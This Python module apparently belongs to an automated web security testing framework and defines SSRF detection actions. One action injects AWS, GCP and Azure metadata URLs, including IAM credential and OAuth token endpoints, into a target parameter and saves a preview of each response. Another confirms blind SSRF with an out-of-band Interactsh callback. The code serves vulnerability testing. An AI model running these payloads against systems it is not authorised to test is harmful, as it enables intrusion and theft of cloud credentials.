"""SSRF detection actions — basic, blind, cloud-metadata probing."""

from actions.registry import action, ActionContext, ActionResult
from core.validators import inject_param
from core.verification_oracle import VerificationOracle, InteractshClient
from tools.wrappers import curl


CLOUD_METADATA_URLS = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
}


@action(
    id="web.ssrf.cloud_metadata",
    risk="MEDIUM",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=120,
    description="Test SSRF by attempting to reach cloud metadata endpoints",
    category="web",
)
async def ssrf_cloud_metadata(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    findings = []

    for provider, metadata_urls in CLOUD_METADATA_URLS.items():
        for metadata_url in metadata_urls:
            test_url = inject_param(url, param, metadata_url)
            result = await curl(test_url, method=method, output="full")
            body = result.get("body", "")
            status = result.get("status", 0)

            if status == 200 and body and len(body) > 10:
                findings.append({
                    "provider": provider,
                    "metadata_url": metadata_url,
                    "status": status,
                    "body_preview": body[:300],
                })

    if findings:
        return ActionResult(
            success=True,
            confidence="FIRM",
            data={"findings": findings},
            evidence={"ssrf_cloud": {"url": url, "param": param, "findings": findings}},
        )

    return ActionResult(False, error="no cloud metadata accessible via SSRF",
                        confidence="TENTATIVE")


@action(
    id="web.ssrf.oob_detect",
    risk="LOW",
    detectability="medium",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=60,
    description="Test blind SSRF via out-of-band callback detection",
    category="web",
)
async def ssrf_oob_detect(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    interactsh = InteractshClient()
    corr_id = await interactsh.register_callback(f"ssrf-test-{param}")

    oob_url = interactsh.callback_url(corr_id, "/test")
    test_url = inject_param(url, param, oob_url)

    await curl(test_url, method=method, output="status")

    # Poll for callback
    verdict = await interactsh.verify(f"ssrf-test-{param}", poll=True)

    if verdict.confidence.value == "CONFIRMED":
        return ActionResult(
            success=True,
            confidence="CONFIRMED",
            data={"correlation_id": corr_id, "technique": "oob_ssrf"},
            evidence=verdict.evidence,
        )

    return ActionResult(False, error="no OOB SSRF callback detected",
                        confidence="TENTATIVE",
                        data={"correlation_id": corr_id})
